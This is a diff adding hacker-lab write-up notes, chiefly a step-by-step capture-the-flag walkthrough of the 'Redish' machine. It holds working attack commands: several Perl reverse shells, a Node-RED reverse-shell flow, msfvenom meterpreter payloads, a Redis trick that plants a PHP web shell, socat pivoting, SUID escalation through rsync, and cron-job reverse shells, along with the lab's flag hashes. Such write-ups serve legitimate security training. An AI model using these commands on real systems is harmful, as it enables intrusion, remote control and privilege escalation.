@@ -1,3 +1,228 @@
+HTB REDISH
+1)As usual we run our nmap scan and show us just tcp port 1880
+2)we navigate to it in browser and just got a /get response
+3)gobuster -t 150 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-
+medium.txt -u http://10.10.10.94:1880/ -x txt,js
+Three directories are returned: icons, red, and vendor. We can enumerate all three just like we
+did above. One interesting file found is /red/about, which shows us the version of the application
+and helps us.
+Browsing to http://10.10.10.94:1880/ gives the following error:
+If we can’t GET /, then how about we try to POST /. You can do this via BURP and get:
+ 
+4)Now we can search for post or get request with curl on the main page
+5)Running curl -X POST http://10.10.10.94:1880
+we got a response with a path and an id
+6)Using this path and id like it showed us we managed to login to node-red cli
+Using the RCE technique above, we can run basic commands to get an understanding of what is
+installed on the box to help us upgrade to a reverse shell. Commands like “which nc” are a good
+and simple way to see if individual programs are present. We can also test for outbound
+connectivity by having Exec run a ping to our Kali box. You will need to modify the Exec node,
+redeploy the flow, and initiate it each time you want to change the command.
+This is a very stripped-down Linux box. The only useful program that I was able to find was perl.
+We can get a reverse shell by modifying Exec to run the following perl script found on Pentest
+Monkey’s Reverse Shell Cheat Sheet. Replace the IP and port with your own. You can leave the
+output attached to debug or delete it; it won’t affect the shell either way.
+*****************************************************************************
+perl -e 'use
+Socket;$i="10.10.14.3";$p=8050;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))
+;if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S")
+;open(STDERR,">&S");exec("/bin/bash -i");};'
+*****************************************************************************
+ 
+Setup your listener, deploy the flow, and click the button on the timestamp node to initiate it
+7)Playing around with setting we managed to get a reverse shell with the following:
+make a tcp-in with ip:port to listen on
+make a exec as default
+make a tcp-out with reply to tcp
+connect it all and run
+ 
+the other way its importing an already created reverse shell flow:
+[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.15.110","port":"9999","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]
+   
+ 
+whithout previously had a nc listening
+ 
+8)We got a shell but its a container and has not tty so we can use shellpop to bring us a tty so we use perl:
+in actual nc connection we put this perl command:
+shellpop --reverse --number 5 --host tun0 --port 2001
+ 
+perl -M Socket -e "\$PKHrmaUTMiwXjh='10.10.15.110';\$VsKVSQDNYqNCy=2000;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$VsKVSQDNYqNCy,inet_aton(\$PKHrmaUTMiwXjh)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};"
+now we listen for conection with nc in the port we specify and we got a tty shell just do bash -i !
+*****To upgrade to meterpreter::******
+1)
+now we can upgrade to a meterpreter shell launch msf and
+set multi/handler
+set payload linux/x86/shell/reverse_tcp and run
+once you got it background CTRL+Z
+and session -u "sessions_id"    or  use post/multi/manage/shell_to_meterpreter
+>meterpreter>
+2)
+another way its creating an elf file like this:
+(not through post/multi/manage/shell_to_meterpreter module because the session
+was dying often). Instead, I created an ELF file, transferred it to the container using base64
+encoding/decoding, set up a listener and executed the file.
+In our local machine:
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.76 LPORT=2002
+-f elf -o meterpreter.elf
+...
+$ base64 -w 0 meterpreter.elf
+...
+$ sudo msfconsole -q
+...
+In the target machine:
+# echo -n <b64 string> | base64 -d > meterpreter.elf
+# chmod +x meterpreter.elf
+# ./meterpreter.elf
+******************************************************
+9)running /sbin/ip a 2>/dev/null we managed to find some new interfaces on this machine
+ 
+Now that we have two potential IPs to target, let’s start enumeration. We don’t have nmap, nc, or
+other useful port scanning options available to us, but there are still a few ways we can do this.
+• We could transfer over a statically compiled version of nc, nmap, or another tool
+• We could try setting up a dynamic tunnel and port scan through proxychains
+• We could use built-in bash scripting for scanning
+• We could run a perl port scanning script
+There may be more methods that I didn’t consider, but I chose to try the bash script since it
+didn’t mean having a dependency on other binaries or script files.
+for p in {1..65535}; do echo hi > /dev/tcp/172.19.0.2/$p && echo port $p is open >
+scan 2>/dev/null; done
+The screen will get cluttered with errors due to the nature of our reverse shell, but the successful
+output will be written to the file ‘scan’. Running this command on the two IPs give us what ports
+are open on each container:
+172.18.0.x 172.19.0.x
+.1 GW .1 GW
+.2 NODE-RED (1880) .2 Alive (6379)
+.3 NODE-RED (1880)
+.4 Alive (80)
+A quick Google search shows that port 6379 typically belongs to a Redis/NoSQL database
+server. Web servers are usually easier to enumerate and exploit, so let’s look at the .4 IP first.
+eth0:   172.18.0.2
+eth1:   172.19.0.4
+now we install nmap on the remote mahchine and run a tcp scan for all ports and all ips x.x.x.x/16
+we found we have 172.19.0.3 with open port 6379 redis
+and 172.19.0.2   with 80 open port apache
+ 
+10)Now we procced to instal nmap uploading it and or redis-cli to start dumping the db.
+ 
+Bash Exploiter:
+ay IP address), 172.19.0.2 , and 172.19.0.3 (which will be our next targets). Considering
+the fact that we are already root at the container and there is nothing in there, we should move on
+with pivoting techniques for the internal network of 172.19.0.0/16 .
+3We will now scan the two target internal hosts for open port. We will use a perl portscanner that
+is available on github (since perl is installed in the machine). Results are:
+ 
+Host 172.19.0.3 has an open port at 6379 (Redis);
+Host 172.19.0.2              has an open port at 80 (HTTP).
+ 
+Next, we will relay connections on these ports to our local machine using metasploit’s portfwd
+with 172.19.0.4 (the container) being as our intermediary:
+       
+meterpreter> portfwd add -l 80 -r 172.19.0.2 -p 80
+meterpreter> portfwd add -l 6379 -r 172.19.0.3 -p 6379
+ 
+Now http://localhost/ will show the following:
+If we examine the HTML source code carefully, we will notice that the webserver has a PHP file
+called ajax.php that connects with Redis DB through a parameter called test :
+/8904n0549008565c554f8108cn11fna4/ajax.php?test=get hits
+ 
+Redis has eloquently explained how it can be used for remote command execution if not securely
+configured to mitigate arbitrary access. You can read about the article here:
+https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt
+ 
+We can try to abuse the vulenerability by uploading a PHP file. I will use redis-cli ( redis
+package is required), and since we already have port fowarding on, the commands we enter will
+relay to 172.19.0.2:6379 . We don’t need to specify a port for redis-cli since it runs by default
+on 6379 and that is exactly the same port we are listening through portfwd . I made the following
+script to automate the process of creating a shell.php file in the /var/www/html directory that
+expects a cmd query to execute system commands, in case our PHP gets removed.
+ 
+#!/bin/bash
+redis-cli flushall
+redis-cli set myshell "<?php echo system(\$_REQUEST['cmd']); ?>"
+redis-cli config set dbfilename "shell.php"
+redis-cli config set dir /var/www/html
+redis-cli save
+ 
+4We should see bunch of OKs after running the script, which means that http://localhost/shell.php
+now exists, and we have RCE as www-data (http://localhost/shell.php?cmd=whoami).
+We can get a shell by uploading a perl script in the /tmp directory of the internal host. Since the
+internal host cannot communicate with our local machine, the reverse shell should point at the
+container ( 172.19.0.4:3000 ), which then we will redirect that traffic to our machine by using a
+tool called socat .
+ 
+The perl script will look like this:
+1)perl -e 'use Socket;$i="172.19.0.4";$p=3000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+then can base64 and URL encode this script and upload it through curl as /tmp/shell.pl or we can run it directly from the browser php shell we have.
+ 
+2)perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"172.19.0.4:3000");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+**************************
+curl --data "cmd=echo+-n+  
+dXNlIFNvY2tldDskaT0nMTcyLjE5LjAuNCc7JHA9MzAwMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU
+1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLG
+luZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwnPiZTJyk7b3BlbihTVERPVVQsJz4mUycpO29wZW4
+oU1RERVJSLCc%2FJlMnKTtleGVjKCcvYmluL3NoIC1pJyk7fTs%3D +|+base64+-
+d+%3E+/tmp/shell.pl" http://localhost/shell.php
+*************************************
+Before sending another curl command to execute this script, we need to get back to msfconsole
+(where we left with portfwd commands) and upload the socat binary (which is an advanced
+netcat ) for port fowarding the traffic from 172.19.0.4:3000 to our machine at
+10.10.14.76:3003 .
+meterpreter> cd /tmp
+meterpreter> upload socat
+meterpreter> shell
+bash -i
+# chmod +x socat
+# ./socat tcp-listen:5001,reuseaddr,fork tcp:10.10.15.100:3003
+We can setup a netcat listener in our machine at port 3003 and enter the following command to
+execute the shell.pl script:
+$ curl --data "cmd=perl+/tmp/shell.pl" http://localhost/shell.php
+This should spawn us a shell for the internal host:
+After enumerating, we see two users in the /home directory, where user.txt is located at
+/home/somaro , however only root is able to read that.
+so after 3 days being stucked finally got it:
+1st method:
+first we have to cp /bin/sh to cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b cuz thats the only dir that belong to us
+then we have to chmod 777 /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
+then we have to chmod u+s /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh
+then we do rsync -p /var/www/html/f187a0ec71ce99642e4f0afbd441a/sh root@backup::src/backup/
+finally we rsync and chmod with the SUID BIT SET with:
+rsync -p --chmod=+s root@backup::src/backup/sh /var/www/html/
+run it ./sh and we are root.
+ 
+2nd method:
+echo -n IyEvYmluL3NoCmNwIC9iaW4vc2ggL3RtcC9zaApjaG1vZCArcyAvdG1wL3No | base64 -d > root.rdb
+$ chmod +x root.rdb
+$ cat root.rdb
+#!/bin/sh
+cp /bin/sh /tmp/sh
+chmod +s /tmp/sh
+$ touch -- "-e sh root.rdb"
+ 
+Now we can upgrade to a meterpreter shell with elf method used before to upload a socat or nercat or wherever we need.
+ 
+11) Now we got root privs and now we can read the user flag
+12)now we read the crontab
+* * * * * root /tmp/nc 172.20.0.2 9001 -e /bin/sh
+13)now reading for clean file in cron.d on backup container we see we can upload our cronjob to it and get a reverse shell on backup container to do this we have to:
+now we have to upload a nc or ncat to www container box:
+once we upload everything we then
+ 
+create our cronjob with:  echo '* * * * * root /tmp/nc 172.20.0.3 7000' > myclean
+or use perl:
+ 
+1)* * * * * root perl -e 'use Socket;$i="172.20.0.3";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+ 
+2)create a script with perl use the same code above for perl shell and upload to /tmp
+upload a cronjob to /etc/cron.d that execute that perl script like this:
+* * * * * root /bin/sh -c "perl /tmp/shell.pl"
+setup your ncat listening for incoming connections on www box.
+ 
+Once we have acces to backup box we must find the root flag doing a find -name root.txt
+ 
+we locate the root flag in  root.txt: backupfs/tmp/d/root/root.txt
+ 
+50d0db644c8d5ff5312ef3d17c2ed205
+ 
 HTB GIDDY
 1)Enumeration with zenmap show open ports 80,443,3389
 2)Going with browser to the machine ip shows us its a IIS server.
@@ -60,7 +285,7 @@ stop-service "Ubiquiti UniFi Video"; ps;   ## notice we append the ps command fo
 24)And we got a reverse nc shell with authority-system privileges
 25)Grab your root flag  : >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> CF559C6C121F683BF3E56891E80641B1
  
-
+ 
 HTB ZIPPER
 1)Nmap shows open port 80 and 22
 2)navigating to 80 show default apache server
@@ -85,7 +310,7 @@ python3 -c 'import pty; pty.spawn("/bin/sh")''
 we see theres a binary with root privileges that SUID enabled
 running strings zabbix-service
 we see its running systemctl as root so we can do that
-to removed unwanted symbolic links in dir : find -name l -delete
+to remove unwanted symbolic links   :   find -name l -delete
 so first:
 1) exporth PATH=.
 2) /bin/echo '/bin/sh -i' >> systemctl
@@ -309,9 +534,9 @@ HTB Bounty
 5)run payload with powershell
 6)multi handler meterpreter
 7)migrate to x64 shell
-You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject 
+You can do this by running the following commands after you already have a 32 bit Meterpreter shell: use windows/local/payload_inject
 set payload windows/x64/meterpreter/reverse_tcp
-or looking for proccess that are already running x64 and migrate to it
+or looking for proccess that are already running in x64 and migrate to it
 8)run post explotation module and exploit(root)
  
  
